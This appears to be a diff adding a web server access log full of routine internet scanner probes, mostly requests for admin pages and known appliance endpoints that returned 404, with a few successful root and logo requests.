+INFO:     47.92.65.140:58486 - "POST /sdk HTTP/1.1" 405 Method Not Allowed
+INFO:     47.92.65.140:58494 - "GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1" 200 OK
+INFO:     47.92.65.140:58516 - "GET /Wd2o HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58504 - "GET /webui HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58530 - "GET /user HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58566 - "GET /user HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58552 - "GET /nmaplowercheck1722626038 HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58578 - "GET /HNAP1 HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58576 - "GET /human.aspx HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58586 - "GET /human.aspx HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58594 - "GET /server-status HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58610 - "GET /localstart.php HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58618 - "GET /dana-cached/hc/HostCheckerInstaller.osx HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58634 - "GET /webui HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58626 - "GET /menu.cfm HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58642 - "GET /dana-na/nc/nc_gina_ver.txt HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58644 - "GET /indice.jsa HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58660 - "GET /%2BCSCOE%2B/logon.html HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58676 - "GET /CFIDE/componentutils/ HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58662 - "GET /index.aspx HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58690 - "GET /base.cfm HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58700 - "GET / HTTP/1.1" 200 OK
+INFO:     47.92.65.140:58726 - "GET /readme.txt HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58728 - "GET / HTTP/1.1" 200 OK
+INFO:     47.92.65.140:58738 - "GET /indice.jsp HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58748 - "GET /owa/ HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58760 - "GET /index.jsa HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58762 - "GET /owa/ HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58766 - "GET /inicio.php HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58772 - "GET /inicio.aspx HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58782 - "GET /default.pl HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58786 - "GET /admin.jsp HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58788 - "GET /admin.asp HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58800 - "GET /admin.html HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58802 - "GET /start.asp HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58814 - "GET /base.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58830 - "GET /index.shtml HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58842 - "GET /home.shtml HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58844 - "GET /indice.asp HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58848 - "GET /indice.php HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58864 - "GET /admin.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58880 - "GET /indice.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58894 - "GET /inicio.cfm HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58908 - "GET /main.shtml HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58910 - "GET /inicio.shtml HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58926 - "GET /menu.html HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58930 - "GET /admin.aspx HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58932 - "GET /home.html HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58942 - "GET /admin.jsa HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58546 - "GET / HTTP/1.1" 200 OK
+INFO:     47.92.65.140:58948 - "GET /menu.jsp HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58952 - "GET /localstart.shtml HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58958 - "GET /home.asp HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58972 - "GET /base.pl HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58976 - "GET /main.jsa HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:58982 - "GET /base.php HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32788 - "GET /base.html HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32796 - "GET /base.jsa HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32806 - "GET /localstart.aspx HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32816 - "GET /base.inc HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32820 - "GET /menu.php HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32836 - "GET /base.jsp HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32844 - "GET /indice.cgi HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32854 - "GET /localstart.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32856 - "GET /base.cgi HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32862 - "GET /index.php HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32868 - "GET /default.jsa HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32870 - "GET /default.php HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32880 - "GET /base.aspx HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32890 - "GET /inicio.asp HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32896 - "GET /base.asp HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32912 - "GET /indice.shtml HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32916 - "GET /localstart.cgi HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32926 - "GET /menu.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32942 - "GET /default.jhtml HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32956 - "GET /index.pl HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32962 - "GET /indice.pl HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32976 - "GET /admin.cgi HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32992 - "GET /main.pl HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:32998 - "GET /main.cgi HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:33010 - "GET /indice.html HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:33022 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:33028 - "GET /indice.aspx HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:33036 - "GET /menu.shtml HTTP/1.1" 404 Not Found
+INFO:     47.92.65.140:33056 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.154:54610 - "GET /index.shtml HTTP/1.1" 404 Not Found
+INFO:     220.196.160.146:17604 - "GET /home.shtml HTTP/1.1" 404 Not Found
+INFO:     129.211.162.158:9386 - "GET /admin.html HTTP/1.1" 404 Not Found
+INFO:     59.83.208.104:40596 - "GET /base.pl HTTP/1.1" 404 Not Found
+INFO:     180.101.244.13:35384 - "GET /localstart.aspx HTTP/1.1" 404 Not Found
+INFO:     220.196.160.73:36810 - "GET /admin.aspx HTTP/1.1" 404 Not Found
+INFO:     59.83.208.104:22034 - "GET /inicio.aspx HTTP/1.1" 404 Not Found
+INFO:     220.196.160.146:46822 - "GET /inicio.cfm HTTP/1.1" 404 Not Found
+INFO:     220.196.160.144:20648 - "GET /server-status HTTP/1.1" 404 Not Found
+INFO:     220.196.160.96:21034 - "GET /main.shtml HTTP/1.1" 404 Not Found
+INFO:     220.196.160.151:44228 - "GET /base.php HTTP/1.1" 404 Not Found
+INFO:     180.101.244.13:23786 - "GET /menu.shtml HTTP/1.1" 404 Not Found
+INFO:     180.101.245.251:23042 - "GET /admin.jhtml HTTP/1.1" 404 Not Found
+INFO:     220.196.160.95:17608 - "GET /home.asp HTTP/1.1" 404 Not Found
+INFO:     220.196.160.101:47884 - "GET /default.pl HTTP/1.1" 404 Not Found
+INFO:     180.101.245.253:19208 - "GET /docs/cplugError.html/ HTTP/1.1" 404 Not Found
+INFO:     129.211.167.200:27874 - "GET /__Additional HTTP/1.1" 404 Not Found
+INFO:     220.196.160.65:45134 - "GET /menu.cfm HTTP/1.1" 404 Not Found
+INFO:     180.101.244.15:21226 - "GET /index.php HTTP/1.1" 404 Not Found
+INFO:     220.196.160.124:36872 - "GET /base.asp HTTP/1.1" 404 Not Found
+INFO:     180.101.245.251:59434 - "GET /indice.aspx HTTP/1.1" 404 Not Found
+INFO:     220.196.160.101:21034 - "GET /user HTTP/1.1" 404 Not Found
+INFO:     220.196.160.154:39238 - "GET /Portal0000.htm HTTP/1.1" 404 Not Found
+INFO:     220.196.160.144:23708 - "GET /Portal/Portal.mwsl HTTP/1.1" 404 Not Found
+INFO:     220.196.160.84:19796 - "GET /owa/ HTTP/1.1" 404 Not Found
+INFO:     220.196.160.53:35144 - "GET /localstart.cgi HTTP/1.1" 404 Not Found
+INFO:     220.196.160.95:44562 - "GET /Wd2o HTTP/1.1" 404 Not Found
+INFO:     59.83.208.103:18232 - "GET /indice.jhtml HTTP/1.1" 404 Not Found
+INFO:     59.83.208.106:53012 - "GET /home.html HTTP/1.1" 404 Not Found
+INFO:     220.196.160.125:56470 - "GET /localstart.php HTTP/1.1" 404 Not Found
+INFO:     220.196.160.65:53500 - "GET /menu.jhtml HTTP/1.1" 404 Not Found
+INFO:     220.196.160.84:25626 - "GET /indice.html HTTP/1.1" 404 Not Found
+INFO:     220.196.160.125:50838 - "GET /dana-cached/hc/HostCheckerInstaller.osx HTTP/1.1" 404 Not Found
+INFO:     220.196.160.117:60414 - "GET /inicio.shtml HTTP/1.1" 404 Not Found
+INFO:     180.101.245.248:56058 - "GET /indice.shtml HTTP/1.1" 404 Not Found
+INFO:     59.83.208.108:55942 - "GET /indice.cgi HTTP/1.1" 404 Not Found
+INFO:     59.83.208.105:37226 - "GET /admin.cgi HTTP/1.1" 404 Not Found
+INFO:     121.225.148.249:38587 - "GET / HTTP/1.1" 200 OK
+INFO:     59.173.134.173:22392 - "GET / HTTP/1.1" 200 OK
+INFO:     60.16.214.178:23602 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     223.113.128.152:58824 - "GET / HTTP/1.1" 200 OK
+INFO:     172.232.211.205:33155 - "GET / HTTP/1.0" 200 OK
+INFO:     172.232.211.100:32472 - "GET / HTTP/1.1" 200 OK
+INFO:     172.232.211.94:25500 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     172.232.211.96:10984 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     172.232.211.96:11004 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     52.76.71.100:2238 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     172.232.211.96:10992 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     172.232.211.96:11010 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+INFO:     172.232.211.157:3465 - "GET / HTTP/1.0" 200 OK
+INFO:     172.232.211.93:41620 - "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 Not Found
+INFO:     172.232.211.94:63736 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     172.232.211.96:39970 - "GET / HTTP/1.1" 200 OK
+INFO:     172.232.211.94:63740 - "GET /solr/admin/info/system HTTP/1.1" 404 Not Found
+INFO:     172.232.211.94:63756 - "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 Not Found
+INFO:     52.76.71.100:57109 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     87.236.176.84:51683 - "GET / HTTP/1.1" 200 OK
+INFO:     87.236.176.53:40965 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.107:41206 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.107:54240 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.107:54260 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.107:54278 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.206.143.92:40306 - "GET / HTTP/1.1" 200 OK
